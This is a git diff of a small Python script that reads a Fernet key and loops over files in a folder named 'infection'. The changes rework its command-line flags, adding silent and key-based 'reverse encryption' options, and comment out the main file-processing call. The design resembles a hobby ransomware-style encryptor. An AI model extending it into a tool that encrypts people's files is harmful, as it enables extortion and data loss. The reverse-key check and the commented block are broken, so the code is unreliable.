@@ -31,7 +31,6 @@ def files_treat():
     folder = "infection"
     with open("key.key", "rb") as mykey:
             key = mykey.read()
-    print(key)
     k = Fernet(key)
     
     for count, filename in enumerate(listdir(folder)):
@@ -55,24 +54,28 @@ def files_treat():
 def main():
 
     parser = argparse.ArgumentParser()
-    parser.add_argument("-help", help="Shows list of avaible flags", 
+    parser.add_argument("-help", "-hp", help="Shows list of avaible flags", 
         action="store_true")
-    parser.add_argument("-version", help="To see the program version", 
+    parser.add_argument("-version", "-v", help="To see the program version", 
         action="store_true")
-    parser.add_argument("-silent", help="To see the program version", 
+    parser.add_argument("-silent", "-s", help="Silent encription files traces", 
         action="store_true")
-    parser.add_argument("-reverse", 
-        help="Use this flag + [encryption key] to reverse encryption", 
-        action="store_true")
+    parser.add_argument("-reverse", "-r", type=str,
+        help="Use this flag + [encryption key] to reverse encryption")
     args = parser.parse_args()
     if args.help:
         print("ok")
     elif args.version:
         print("ok")
-    elif args.reverse:
-        print("ok")
+    if args.reverse == 1:
+        print("yes key!")
     else:
-        files_treat()
+        print("-reverse + [key]")
+
+
+#   !!!! https://docs.python.org/3/library/argparse.html !!!!
+#    if else:
+#        files_treat()
 
 if __name__ == '__main__':
     main()
